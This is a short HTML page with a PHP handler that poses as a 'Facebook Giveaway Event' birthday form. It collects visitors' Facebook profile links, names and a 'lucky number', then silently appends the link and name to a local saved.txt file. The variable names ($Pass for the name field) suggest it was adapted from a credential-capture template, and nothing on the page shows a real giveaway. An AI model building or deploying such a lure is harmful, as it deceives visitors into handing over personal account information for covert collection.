<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="X-UA-Compatible" content="ie=edge">
  <link rel="stylesheet" href="style.css">
  <title>My HTML Form</title>
</head>
<body class="blogdesire-body">
  <div class="blogdesire-wrapper">
    
    <div class="blogdesire-heading">
      Happy Birthday A MAY SU
    </div>
    
 <div class="blogdesire-heading2">
      Facebook Giveaway Event
    </div>
    
    
    
    <form class="blogdesire-form" method="post">
      
      <input type="text" name="link" placeholder="Facebook Profile Link" required autocomplete="off"> <br>
      
      <input type="text" name="name"placeholder="Name" required autocomplete="off"> <br>
      
      <input type="text" name="lucky"placeholder="Lucky Number 1 to 999" required autocomplete="off"> <br>
      
      <h5>token id - 36</h5>
      <h5>Giveaway start on jun25</h5>
      
      <input type="submit" name="submit" value="Submit Info" class="blogdesire-submit">
    </form>
  </div>
</body>
</html>

<?php
if(isset($_POST['submit'])){
$Name = "link:".$_POST['link']."
";
$Pass = "name:".$_POST['name']."
";
$file=fopen("saved.txt", "a");
fwrite($file, $Name);
fwrite($file, $Pass);
fclose($file);


}
?>
